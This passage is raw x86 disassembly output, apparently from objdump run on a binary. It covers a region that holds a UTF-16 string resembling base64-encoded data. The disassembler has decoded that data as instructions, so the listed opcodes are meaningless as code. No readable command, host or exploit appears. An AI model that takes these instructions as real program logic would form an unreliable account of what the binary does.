  40a8d9:	00 75 00             	add    %dh,0x0(%ebp)
  40a8dc:	6d                   	insl   (%dx),%es:(%edi)
  40a8dd:	00 58 00             	add    %bl,0x0(%eax)
  40a8e0:	66 00 54 00 37       	data16 add %dl,0x37(%eax,%eax,1)
  40a8e5:	00 36                	add    %dh,(%esi)
  40a8e7:	00 79 00             	add    %bh,0x0(%ecx)
  40a8ea:	75 00                	jne    0x40a8ec
  40a8ec:	32 00                	xor    (%eax),%al
  40a8ee:	32 00                	xor    (%eax),%al
  40a8f0:	77 00                	ja     0x40a8f2
  40a8f2:	35 00 4a 00 6e       	xor    $0x6e004a00,%eax
  40a8f7:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40a8fb:	00 42 00             	add    %al,0x0(%edx)
  40a8fe:	4f                   	dec    %edi
  40a8ff:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  40a903:	00 4f 00             	add    %cl,0x0(%edi)
  40a906:	6b 00 43             	imul   $0x43,(%eax),%eax
  40a909:	00 36                	add    %dh,(%esi)
  40a90b:	00 42 00             	add    %al,0x0(%edx)
  40a90e:	74 00                	je     0x40a910
  40a910:	59                   	pop    %ecx
  40a911:	00 7a 00             	add    %bh,0x0(%edx)
  40a914:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40a918:	70 00                	jo     0x40a91a
  40a91a:	4f                   	dec    %edi
  40a91b:	00 31                	add    %dh,(%ecx)
  40a91d:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  40a921:	00 71 00             	add    %dh,0x0(%ecx)
  40a924:	75 00                	jne    0x40a926
  40a926:	79 00                	jns    0x40a928
  40a928:	78 00                	js     0x40a92a
  40a92a:	4c                   	dec    %esp
  40a92b:	00 38                	add    %bh,(%eax)
  40a92d:	00 61 00             	add    %ah,0x0(%ecx)
  40a930:	33 00                	xor    (%eax),%eax
  40a932:	4f                   	dec    %edi
  40a933:	00 43 00             	add    %al,0x0(%ebx)
  40a936:	41                   	inc    %ecx
  40a937:	00 52 00             	add    %dl,0x0(%edx)
  40a93a:	6d                   	insl   (%dx),%es:(%edi)
  40a93b:	00 79 00             	add    %bh,0x0(%ecx)
  40a93e:	79 00                	jns    0x40a940
  40a940:	42                   	inc    %edx
  40a941:	00 47 00             	add    %al,0x0(%edi)
  40a944:	71 00                	jno    0x40a946
  40a946:	41                   	inc    %ecx
  40a947:	00 6a 00             	add    %ch,0x0(%edx)
  40a94a:	72 00                	jb     0x40a94c
  40a94c:	6d                   	insl   (%dx),%es:(%edi)
  40a94d:	00 31                	add    %dh,(%ecx)
  40a94f:	00 4a 00             	add    %cl,0x0(%edx)
  40a952:	56                   	push   %esi
  40a953:	00 71 00             	add    %dh,0x0(%ecx)
  40a956:	57                   	push   %edi
  40a957:	00 32                	add    %dh,(%edx)
  40a959:	00 4a 00             	add    %cl,0x0(%edx)
  40a95c:	43                   	inc    %ebx
  40a95d:	00 67 00             	add    %ah,0x0(%edi)
  40a960:	71 00                	jno    0x40a962
  40a962:	78 00                	js     0x40a964
  40a964:	42                   	inc    %edx
  40a965:	00 52 00             	add    %dl,0x0(%edx)
  40a968:	2b 00                	sub    (%eax),%eax
  40a96a:	77 00                	ja     0x40a96c
  40a96c:	53                   	push   %ebx
  40a96d:	00 57 00             	add    %dl,0x0(%edi)
  40a970:	69 00 2b 00 44 00    	imul   $0x44002b,(%eax),%eax
  40a976:	41                   	inc    %ecx
  40a977:	00 68 00             	add    %ch,0x0(%eax)
  40a97a:	30 00                	xor    %al,(%eax)
  40a97c:	49                   	dec    %ecx
  40a97d:	00 45 00             	add    %al,0x0(%ebp)
  40a980:	55                   	push   %ebp
  40a981:	00 68 00             	add    %ch,0x0(%eax)
  40a984:	6a 00                	push   $0x0
  40a986:	45                   	inc    %ebp
  40a987:	00 71 00             	add    %dh,0x0(%ecx)
  40a98a:	59                   	pop    %ecx
  40a98b:	00 73 00             	add    %dh,0x0(%ebx)
  40a98e:	69 00 56 00 4a 00    	imul   $0x4a0056,(%eax),%eax
  40a994:	6c                   	insb   (%dx),%es:(%edi)
  40a995:	00 66 00             	add    %ah,0x0(%esi)
  40a998:	72 00                	jb     0x40a99a
  40a99a:	68 00 78 00 2f       	push   $0x2f007800
  40a99f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a9a2:	74 00                	je     0x40a9a4
  40a9a4:	62 00                	bound  %eax,(%eax)
  40a9a6:	56                   	push   %esi
  40a9a7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a9aa:	63 00                	arpl   %eax,(%eax)
  40a9ac:	44                   	inc    %esp
  40a9ad:	00 31                	add    %dh,(%ecx)
  40a9af:	00 45 00             	add    %al,0x0(%ebp)
  40a9b2:	63 00                	arpl   %eax,(%eax)
  40a9b4:	68 00 4f 00 41       	push   $0x41004f00
  40a9b9:	00 37                	add    %dh,(%edi)
  40a9bb:	00 42 00             	add    %al,0x0(%edx)
  40a9be:	67 00 67 00          	add    %ah,0x0(%bx)
  40a9c2:	53                   	push   %ebx
  40a9c3:	00 59 00             	add    %bl,0x0(%ecx)
  40a9c6:	6a 00                	push   $0x0
  40a9c8:	39 00                	cmp    %eax,(%eax)
  40a9ca:	74 00                	je     0x40a9cc
  40a9cc:	6a 00                	push   $0x0
  40a9ce:	51                   	push   %ecx
  40a9cf:	00 30                	add    %dh,(%eax)
  40a9d1:	00 65 00             	add    %ah,0x0(%ebp)
  40a9d4:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40a9d8:	65 00 2f             	add    %ch,%gs:(%edi)
  40a9db:	00 35 00 70 00 74    	add    %dh,0x74007000
  40a9e1:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40a9e5:	00 30                	add    %dh,(%eax)
  40a9e7:	00 33                	add    %dh,(%ebx)
  40a9e9:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40a9ed:	00 57 00             	add    %dl,0x0(%edi)
  40a9f0:	4b                   	dec    %ebx
  40a9f1:	00 2f                	add    %ch,(%edi)
  40a9f3:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9f6:	33 00                	xor    (%eax),%eax
  40a9f8:	4b                   	dec    %ebx
  40a9f9:	00 55 00             	add    %dl,0x0(%ebp)
  40a9fc:	4d                   	dec    %ebp
  40a9fd:	00 65 00             	add    %ah,0x0(%ebp)
  40aa00:	4e                   	dec    %esi
  40aa01:	00 41 00             	add    %al,0x0(%ecx)
  40aa04:	49                   	dec    %ecx
  40aa05:	00 2b                	add    %ch,(%ebx)
  40aa07:	00 67 00             	add    %ah,0x0(%edi)
  40aa0a:	77 00                	ja     0x40aa0c
  40aa0c:	35 00 30 00 38       	xor    $0x38003000,%eax
  40aa11:	00 46 00             	add    %al,0x0(%esi)
  40aa14:	45                   	inc    %ebp
  40aa15:	00 53 00             	add    %dl,0x0(%ebx)
  40aa18:	4a                   	dec    %edx
  40aa19:	00 77 00             	add    %dh,0x0(%edi)
  40aa1c:	47                   	inc    %edi
  40aa1d:	00 73 00             	add    %dh,0x0(%ebx)
  40aa20:	59                   	pop    %ecx
  40aa21:	00 76 00             	add    %dh,0x0(%esi)
  40aa24:	70 00                	jo     0x40aa26
  40aa26:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40aa2a:	6b 00 35             	imul   $0x35,(%eax),%eax
  40aa2d:	00 47 00             	add    %al,0x0(%edi)
  40aa30:	50                   	push   %eax
  40aa31:	00 32                	add    %dh,(%edx)
  40aa33:	00 35 00 6d 00 64    	add    %dh,0x64006d00
  40aa39:	00 79 00             	add    %bh,0x0(%ecx)
  40aa3c:	43                   	inc    %ebx
  40aa3d:	00 6a 00             	add    %ch,0x0(%edx)
  40aa40:	73 00                	jae    0x40aa42
  40aa42:	58                   	pop    %eax
  40aa43:	00 61 00             	add    %ah,0x0(%ecx)
  40aa46:	2b 00                	sub    (%eax),%eax
  40aa48:	47                   	inc    %edi
  40aa49:	00 7a 00             	add    %bh,0x0(%edx)
  40aa4c:	4f                   	dec    %edi
  40aa4d:	00 73 00             	add    %dh,0x0(%ebx)
  40aa50:	4f                   	dec    %edi
  40aa51:	00 41 00             	add    %al,0x0(%ecx)
  40aa54:	38 00                	cmp    %al,(%eax)
  40aa56:	48                   	dec    %eax
  40aa57:	00 48 00             	add    %cl,0x0(%eax)
  40aa5a:	61                   	popa
  40aa5b:	00 32                	add    %dh,(%edx)
  40aa5d:	00 62 00             	add    %ah,0x0(%edx)
  40aa60:	55                   	push   %ebp
  40aa61:	00 46 00             	add    %al,0x0(%esi)
  40aa64:	42                   	inc    %edx
  40aa65:	00 39                	add    %bh,(%ecx)
  40aa67:	00 72 00             	add    %dh,0x0(%edx)
  40aa6a:	47                   	inc    %edi
  40aa6b:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40aa6f:	00 42 00             	add    %al,0x0(%edx)
  40aa72:	61                   	popa
  40aa73:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa76:	56                   	push   %esi
  40aa77:	00 31                	add    %dh,(%ecx)
  40aa79:	00 67 00             	add    %ah,0x0(%edi)
  40aa7c:	59                   	pop    %ecx
  40aa7d:	00 53 00             	add    %dl,0x0(%ebx)
  40aa80:	61                   	popa
  40aa81:	00 4a 00             	add    %cl,0x0(%edx)
  40aa84:	32 00                	xor    (%eax),%al
  40aa86:	63 00                	arpl   %eax,(%eax)
  40aa88:	75 00                	jne    0x40aa8a
  40aa8a:	75 00                	jne    0x40aa8c
  40aa8c:	69 00 4b 00 49 00    	imul   $0x49004b,(%eax),%eax
  40aa92:	52                   	push   %edx
  40aa93:	00 37                	add    %dh,(%edi)
  40aa95:	00 65 00             	add    %ah,0x0(%ebp)
  40aa98:	30 00                	xor    %al,(%eax)
  40aa9a:	4a                   	dec    %edx
  40aa9b:	00 48 00             	add    %cl,0x0(%eax)
  40aa9e:	33 00                	xor    (%eax),%eax
  40aaa0:	38 00                	cmp    %al,(%eax)
  40aaa2:	32 00                	xor    (%eax),%al
  40aaa4:	49                   	dec    %ecx
  40aaa5:	00 76 00             	add    %dh,0x0(%esi)
  40aaa8:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40aaac:	50                   	push   %eax
  40aaad:	00 6a 00             	add    %ch,0x0(%edx)
  40aab0:	72 00                	jb     0x40aab2
  40aab2:	63 00                	arpl   %eax,(%eax)
  40aab4:	48                   	dec    %eax
  40aab5:	00 39                	add    %bh,(%ecx)
  40aab7:	00 50 00             	add    %dl,0x0(%eax)
  40aaba:	55                   	push   %ebp
  40aabb:	00 33                	add    %dh,(%ebx)
  40aabd:	00 6f 00             	add    %ch,0x0(%edi)
  40aac0:	37                   	aaa
  40aac1:	00 45 00             	add    %al,0x0(%ebp)
  40aac4:	62 00                	bound  %eax,(%eax)
  40aac6:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40aaca:	41                   	inc    %ecx
  40aacb:	00 47 00             	add    %al,0x0(%edi)
  40aace:	47                   	inc    %edi
  40aacf:	00 39                	add    %bh,(%ecx)
  40aad1:	00 6a 00             	add    %ch,0x0(%edx)
  40aad4:	70 00                	jo     0x40aad6
  40aad6:	43                   	inc    %ebx
  40aad7:	00 2f                	add    %ch,(%edi)
  40aad9:	00 4e 00             	add    %cl,0x0(%esi)
  40aadc:	34 00                	xor    $0x0,%al
  40aade:	31 00                	xor    %eax,(%eax)
  40aae0:	74 00                	je     0x40aae2
  40aae2:	72 00                	jb     0x40aae4
  40aae4:	4f                   	dec    %edi
  40aae5:	00 75 00             	add    %dh,0x0(%ebp)
  40aae8:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40aaec:	5a                   	pop    %edx
  40aaed:	00 51 00             	add    %dl,0x0(%ecx)
  40aaf0:	53                   	push   %ebx
  40aaf1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aaf4:	47                   	inc    %edi
  40aaf5:	00 7a 00             	add    %bh,0x0(%edx)
  40aaf8:	51                   	push   %ecx
  40aaf9:	00 52 00             	add    %dl,0x0(%edx)
  40aafc:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40ab00:	6c                   	insb   (%dx),%es:(%edi)
  40ab01:	00 47 00             	add    %al,0x0(%edi)
  40ab04:	59                   	pop    %ecx
  40ab05:	00 78 00             	add    %bh,0x0(%eax)
  40ab08:	49                   	dec    %ecx
  40ab09:	00 5a 00             	add    %bl,0x0(%edx)
  40ab0c:	50                   	push   %eax
  40ab0d:	00 56 00             	add    %dl,0x0(%esi)
  40ab10:	45                   	inc    %ebp
  40ab11:	00 37                	add    %dh,(%edi)
  40ab13:	00 33                	add    %dh,(%ebx)
  40ab15:	00 37                	add    %dh,(%edi)
  40ab17:	00 6a 00             	add    %ch,0x0(%edx)
  40ab1a:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40ab1e:	39 00                	cmp    %eax,(%eax)
  40ab20:	61                   	popa
  40ab21:	00 30                	add    %dh,(%eax)
  40ab23:	00 49 00             	add    %cl,0x0(%ecx)
  40ab26:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40ab2a:	49                   	dec    %ecx
  40ab2b:	00 43 00             	add    %al,0x0(%ebx)
  40ab2e:	37                   	aaa
  40ab2f:	00 61 00             	add    %ah,0x0(%ecx)
  40ab32:	4d                   	dec    %ebp
  40ab33:	00 7a 00             	add    %bh,0x0(%edx)
  40ab36:	57                   	push   %edi
  40ab37:	00 47 00             	add    %al,0x0(%edi)
  40ab3a:	6d                   	insl   (%dx),%es:(%edi)
  40ab3b:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  40ab3f:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40ab43:	00 53 00             	add    %dl,0x0(%ebx)
  40ab46:	39 00                	cmp    %eax,(%eax)
  40ab48:	6d                   	insl   (%dx),%es:(%edi)
  40ab49:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab4c:	76 00                	jbe    0x40ab4e
  40ab4e:	77 00                	ja     0x40ab50
  40ab50:	4e                   	dec    %esi
  40ab51:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab54:	5a                   	pop    %edx
  40ab55:	00 77 00             	add    %dh,0x0(%edi)
  40ab58:	57                   	push   %edi
  40ab59:	00 36                	add    %dh,(%esi)
  40ab5b:	00 5a 00             	add    %bl,0x0(%edx)
  40ab5e:	53                   	push   %ebx
  40ab5f:	00 65 00             	add    %ah,0x0(%ebp)
  40ab62:	50                   	push   %eax
  40ab63:	00 51 00             	add    %dl,0x0(%ecx)
  40ab66:	35 00 49 00 49       	xor    $0x49004900,%eax
  40ab6b:	00 6e 00             	add    %ch,0x0(%esi)
  40ab6e:	74 00                	je     0x40ab70
  40ab70:	68 00 67 00 7a       	push   $0x7a006700
  40ab75:	00 33                	add    %dh,(%ebx)
  40ab77:	00 37                	add    %dh,(%edi)
  40ab79:	00 36                	add    %dh,(%esi)
  40ab7b:	00 35 00 34 00 77    	add    %dh,0x77003400
  40ab81:	00 48 00             	add    %cl,0x0(%eax)
  40ab84:	4e                   	dec    %esi
  40ab85:	00 6a 00             	add    %ch,0x0(%edx)
  40ab88:	41                   	inc    %ecx
  40ab89:	00 76 00             	add    %dh,0x0(%esi)
  40ab8c:	53                   	push   %ebx
  40ab8d:	00 32                	add    %dh,(%edx)
  40ab8f:	00 2b                	add    %ch,(%ebx)
  40ab91:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40ab95:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40ab99:	00 37                	add    %dh,(%edi)
  40ab9b:	00 30                	add    %dh,(%eax)
  40ab9d:	00 4e 00             	add    %cl,0x0(%esi)
  40aba0:	67 00 44 00          	add    %al,0x0(%si)
  40aba4:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
  40aba8:	74 00                	je     0x40abaa
  40abaa:	72 00                	jb     0x40abac
  40abac:	54                   	push   %esp
  40abad:	00 45 00             	add    %al,0x0(%ebp)
  40abb0:	35 00 65 00 4e       	xor    $0x4e006500,%eax
  40abb5:	00 69 00             	add    %ch,0x0(%ecx)
  40abb8:	4a                   	dec    %edx
  40abb9:	00 31                	add    %dh,(%ecx)
  40abbb:	00 6d 00             	add    %ch,0x0(%ebp)
  40abbe:	6e                   	outsb  %ds:(%esi),(%dx)
  40abbf:	00 77 00             	add    %dh,0x0(%edi)
  40abc2:	78 00                	js     0x40abc4
  40abc4:	5a                   	pop    %edx
  40abc5:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  40abc9:	00 51 00             	add    %dl,0x0(%ecx)
  40abcc:	56                   	push   %esi
  40abcd:	00 52 00             	add    %dl,0x0(%edx)
  40abd0:	44                   	inc    %esp
  40abd1:	00 72 00             	add    %dh,0x0(%edx)
  40abd4:	2f                   	das
  40abd5:	00 4b 00             	add    %cl,0x0(%ebx)
  40abd8:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40abdc:	51                   	push   %ecx
  40abdd:	00 65 00             	add    %ah,0x0(%ebp)
  40abe0:	6a 00                	push   $0x0
  40abe2:	71 00                	jno    0x40abe4
  40abe4:	64 00 74 00 63       	add    %dh,%fs:0x63(%eax,%eax,1)
  40abe9:	00 46 00             	add    %al,0x0(%esi)
  40abec:	71 00                	jno    0x40abee
  40abee:	59                   	pop    %ecx
  40abef:	00 4b 00             	add    %cl,0x0(%ebx)
  40abf2:	44                   	inc    %esp
  40abf3:	00 76 00             	add    %dh,0x0(%esi)
  40abf6:	37                   	aaa
  40abf7:	00 30                	add    %dh,(%eax)
  40abf9:	00 41 00             	add    %al,0x0(%ecx)
  40abfc:	33 00                	xor    (%eax),%eax
  40abfe:	33 00                	xor    (%eax),%eax
  40ac00:	4d                   	dec    %ebp
  40ac01:	00 45 00             	add    %al,0x0(%ebp)
  40ac04:	6c                   	insb   (%dx),%es:(%edi)
  40ac05:	00 58 00             	add    %bl,0x0(%eax)
  40ac08:	73 00                	jae    0x40ac0a
  40ac0a:	76 00                	jbe    0x40ac0c
  40ac0c:	47                   	inc    %edi
  40ac0d:	00 68 00             	add    %ch,0x0(%eax)
  40ac10:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac11:	00 78 00             	add    %bh,0x0(%eax)
  40ac14:	74 00                	je     0x40ac16
  40ac16:	56                   	push   %esi
  40ac17:	00 7a 00             	add    %bh,0x0(%edx)
  40ac1a:	2b 00                	sub    (%eax),%eax
  40ac1c:	43                   	inc    %ebx
  40ac1d:	00 66 00             	add    %ah,0x0(%esi)
  40ac20:	68 00 4a 00 35       	push   $0x35004a00
  40ac25:	00 70 00             	add    %dh,0x0(%eax)
  40ac28:	31 00                	xor    %eax,(%eax)
  40ac2a:	54                   	push   %esp
  40ac2b:	00 35 00 71 00 2b    	add    %dh,0x2b007100
  40ac31:	00 78 00             	add    %bh,0x0(%eax)
  40ac34:	32 00                	xor    (%eax),%al
  40ac36:	51                   	push   %ecx
  40ac37:	00 57 00             	add    %dl,0x0(%edi)
  40ac3a:	79 00                	jns    0x40ac3c
  40ac3c:	78 00                	js     0x40ac3e
  40ac3e:	7a 00                	jp     0x40ac40
  40ac40:	2f                   	das
  40ac41:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac44:	78 00                	js     0x40ac46
  40ac46:	46                   	inc    %esi
  40ac47:	00 30                	add    %dh,(%eax)
  40ac49:	00 46 00             	add    %al,0x0(%esi)
  40ac4c:	65 00 30             	add    %dh,%gs:(%eax)
  40ac4f:	00 43 00             	add    %al,0x0(%ebx)
  40ac52:	43                   	inc    %ebx
  40ac53:	00 5a 00             	add    %bl,0x0(%edx)
  40ac56:	4f                   	dec    %edi
  40ac57:	00 62 00             	add    %ah,0x0(%edx)
  40ac5a:	2b 00                	sub    (%eax),%eax
  40ac5c:	62 00                	bound  %eax,(%eax)
  40ac5e:	75 00                	jne    0x40ac60
  40ac60:	55                   	push   %ebp
  40ac61:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  40ac65:	00 79 00             	add    %bh,0x0(%ecx)
  40ac68:	52                   	push   %edx
  40ac69:	00 67 00             	add    %ah,0x0(%edi)
  40ac6c:	7a 00                	jp     0x40ac6e
  40ac6e:	39 00                	cmp    %eax,(%eax)
  40ac70:	4e                   	dec    %esi
  40ac71:	00 70 00             	add    %dh,0x0(%eax)
  40ac74:	79 00                	jns    0x40ac76
  40ac76:	55                   	push   %ebp
  40ac77:	00 52 00             	add    %dl,0x0(%edx)
  40ac7a:	5a                   	pop    %edx
  40ac7b:	00 67 00             	add    %ah,0x0(%edi)
  40ac7e:	44                   	inc    %esp
  40ac7f:	00 55 00             	add    %dl,0x0(%ebp)
  40ac82:	69 00 79 00 37 00    	imul   $0x370079,(%eax),%eax
  40ac88:	72 00                	jb     0x40ac8a
  40ac8a:	72 00                	jb     0x40ac8c
  40ac8c:	4f                   	dec    %edi
  40ac8d:	00 45 00             	add    %al,0x0(%ebp)
  40ac90:	76 00                	jbe    0x40ac92
  40ac92:	73 00                	jae    0x40ac94
  40ac94:	43                   	inc    %ebx
  40ac95:	00 53 00             	add    %dl,0x0(%ebx)
  40ac98:	62 00                	bound  %eax,(%eax)
  40ac9a:	55                   	push   %ebp
  40ac9b:	00 6a 00             	add    %ch,0x0(%edx)
  40ac9e:	37                   	aaa
  40ac9f:	00 76 00             	add    %dh,0x0(%esi)
  40aca2:	75 00                	jne    0x40aca4
  40aca4:	4e                   	dec    %esi
  40aca5:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40aca9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40acac:	74 00                	je     0x40acae
  40acae:	43                   	inc    %ebx
  40acaf:	00 2f                	add    %ch,(%edi)
  40acb1:	00 4f 00             	add    %cl,0x0(%edi)
  40acb4:	4f                   	dec    %edi
  40acb5:	00 4a 00             	add    %cl,0x0(%edx)
  40acb8:	6f                   	outsl  %ds:(%esi),(%dx)
  40acb9:	00 47 00             	add    %al,0x0(%edi)
  40acbc:	46                   	inc    %esi
  40acbd:	00 45 00             	add    %al,0x0(%ebp)
  40acc0:	76 00                	jbe    0x40acc2
  40acc2:	62 00                	bound  %eax,(%eax)
  40acc4:	47                   	inc    %edi
  40acc5:	00 45 00             	add    %al,0x0(%ebp)
  40acc8:	7a 00                	jp     0x40acca
  40acca:	49                   	dec    %ecx
  40accb:	00 30                	add    %dh,(%eax)
  40accd:	00 71 00             	add    %dh,0x0(%ecx)
  40acd0:	32 00                	xor    (%eax),%al
  40acd2:	30 00                	xor    %al,(%eax)
  40acd4:	41                   	inc    %ecx
  40acd5:	00 69 00             	add    %ch,0x0(%ecx)
  40acd8:	6f                   	outsl  %ds:(%esi),(%dx)
  40acd9:	00 36                	add    %dh,(%esi)
  40acdb:	00 79 00             	add    %bh,0x0(%ecx)
  40acde:	52                   	push   %edx
  40acdf:	00 6d 00             	add    %ch,0x0(%ebp)
  40ace2:	6d                   	insl   (%dx),%es:(%edi)
  40ace3:	00 6f 00             	add    %ch,0x0(%edi)
  40ace6:	63 00                	arpl   %eax,(%eax)
  40ace8:	68 00 68 00 48       	push   $0x48006800
  40aced:	00 73 00             	add    %dh,0x0(%ebx)
  40acf0:	32 00                	xor    (%eax),%al
  40acf2:	37                   	aaa
  40acf3:	00 46 00             	add    %al,0x0(%esi)
  40acf6:	30 00                	xor    %al,(%eax)
  40acf8:	63 00                	arpl   %eax,(%eax)
  40acfa:	52                   	push   %edx
  40acfb:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
  40acff:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
  40ad03:	00 68 00             	add    %ch,0x0(%eax)
  40ad06:	4e                   	dec    %esi
  40ad07:	00 47 00             	add    %al,0x0(%edi)
  40ad0a:	71 00                	jno    0x40ad0c
  40ad0c:	77 00                	ja     0x40ad0e
  40ad0e:	74 00                	je     0x40ad10
  40ad10:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40ad14:	7a 00                	jp     0x40ad16
  40ad16:	4b                   	dec    %ebx
  40ad17:	00 63 00             	add    %ah,0x0(%ebx)
  40ad1a:	53                   	push   %ebx
  40ad1b:	00 48 00             	add    %cl,0x0(%eax)
  40ad1e:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40ad22:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad23:	00 57 00             	add    %dl,0x0(%edi)
  40ad26:	2f                   	das
  40ad27:	00 39                	add    %bh,(%ecx)
  40ad29:	00 36                	add    %dh,(%esi)
  40ad2b:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40ad2f:	00 50 00             	add    %dl,0x0(%eax)
  40ad32:	76 00                	jbe    0x40ad34
  40ad34:	74 00                	je     0x40ad36
  40ad36:	73 00                	jae    0x40ad38
  40ad38:	31 00                	xor    %eax,(%eax)
  40ad3a:	62 00                	bound  %eax,(%eax)
  40ad3c:	42                   	inc    %edx
  40ad3d:	00 36                	add    %dh,(%esi)
  40ad3f:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad42:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40ad46:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad47:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40ad4b:	00 68 00             	add    %ch,0x0(%eax)
  40ad4e:	4d                   	dec    %ebp
  40ad4f:	00 42 00             	add    %al,0x0(%edx)
  40ad52:	74 00                	je     0x40ad54
  40ad54:	73 00                	jae    0x40ad56
  40ad56:	54                   	push   %esp
  40ad57:	00 30                	add    %dh,(%eax)
  40ad59:	00 36                	add    %dh,(%esi)
  40ad5b:	00 65 00             	add    %ah,0x0(%ebp)
  40ad5e:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40ad62:	54                   	push   %esp
  40ad63:	00 66 00             	add    %ah,0x0(%esi)
  40ad66:	57                   	push   %edi
  40ad67:	00 59 00             	add    %bl,0x0(%ecx)
  40ad6a:	2f                   	das
  40ad6b:	00 30                	add    %dh,(%eax)
  40ad6d:	00 42 00             	add    %al,0x0(%edx)
  40ad70:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad71:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40ad75:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  40ad79:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad7c:	5a                   	pop    %edx
  40ad7d:	00 73 00             	add    %dh,0x0(%ebx)
  40ad80:	41                   	inc    %ecx
  40ad81:	00 62 00             	add    %ah,0x0(%edx)
  40ad84:	74 00                	je     0x40ad86
  40ad86:	71 00                	jno    0x40ad88
  40ad88:	59                   	pop    %ecx
  40ad89:	00 65 00             	add    %ah,0x0(%ebp)
  40ad8c:	4d                   	dec    %ebp
  40ad8d:	00 41 00             	add    %al,0x0(%ecx)
  40ad90:	6a 00                	push   $0x0
  40ad92:	35 00 48 00 51       	xor    $0x51004800,%eax
  40ad97:	00 61 00             	add    %ah,0x0(%ecx)
  40ad9a:	77 00                	ja     0x40ad9c
  40ad9c:	70 00                	jo     0x40ad9e
  40ad9e:	52                   	push   %edx
  40ad9f:	00 59 00             	add    %bl,0x0(%ecx)
  40ada2:	6d                   	insl   (%dx),%es:(%edi)
  40ada3:	00 73 00             	add    %dh,0x0(%ebx)
  40ada6:	78 00                	js     0x40ada8
  40ada8:	68 00 62 00 52       	push   $0x52006200
  40adad:	00 57 00             	add    %dl,0x0(%edi)
  40adb0:	45                   	inc    %ebp
  40adb1:	00 4e 00             	add    %cl,0x0(%esi)
  40adb4:	59                   	pop    %ecx
  40adb5:	00 55 00             	add    %dl,0x0(%ebp)
  40adb8:	4f                   	dec    %edi
  40adb9:	00 38                	add    %bh,(%eax)
  40adbb:	00 59 00             	add    %bl,0x0(%ecx)
  40adbe:	57                   	push   %edi
  40adbf:	00 2f                	add    %ch,(%edi)
  40adc1:	00 76 00             	add    %dh,0x0(%esi)
  40adc4:	49                   	dec    %ecx
  40adc5:	00 49 00             	add    %cl,0x0(%ecx)
  40adc8:	4b                   	dec    %ebx
  40adc9:	00 43 00             	add    %al,0x0(%ebx)
  40adcc:	44                   	inc    %esp
  40adcd:	00 49 00             	add    %cl,0x0(%ecx)
  40add0:	76 00                	jbe    0x40add2
  40add2:	37                   	aaa
  40add3:	00 79 00             	add    %bh,0x0(%ecx)
  40add6:	77 00                	ja     0x40add8
  40add8:	56                   	push   %esi
  40add9:	00 6a 00             	add    %ch,0x0(%edx)
  40addc:	34 00                	xor    $0x0,%al
  40adde:	78 00                	js     0x40ade0
  40ade0:	44                   	inc    %esp
  40ade1:	00 62 00             	add    %ah,0x0(%edx)
  40ade4:	4c                   	dec    %esp
  40ade5:	00 32                	add    %dh,(%edx)
  40ade7:	00 7a 00             	add    %bh,0x0(%edx)
  40adea:	78 00                	js     0x40adec
  40adec:	37                   	aaa
  40aded:	00 75 00             	add    %dh,0x0(%ebp)
  40adf0:	58                   	pop    %eax
  40adf1:	00 49 00             	add    %cl,0x0(%ecx)
  40adf4:	61                   	popa
  40adf5:	00 38                	add    %bh,(%eax)
  40adf7:	00 77 00             	add    %dh,0x0(%edi)
  40adfa:	71 00                	jno    0x40adfc
  40adfc:	6a 00                	push   $0x0
  40adfe:	5a                   	pop    %edx
  40adff:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae02:	46                   	inc    %esi
  40ae03:	00 59 00             	add    %bl,0x0(%ecx)
  40ae06:	54                   	push   %esp
  40ae07:	00 48 00             	add    %cl,0x0(%eax)
  40ae0a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae0b:	00 71 00             	add    %dh,0x0(%ecx)
  40ae0e:	52                   	push   %edx
  40ae0f:	00 52 00             	add    %dl,0x0(%edx)
  40ae12:	72 00                	jb     0x40ae14
  40ae14:	4e                   	dec    %esi
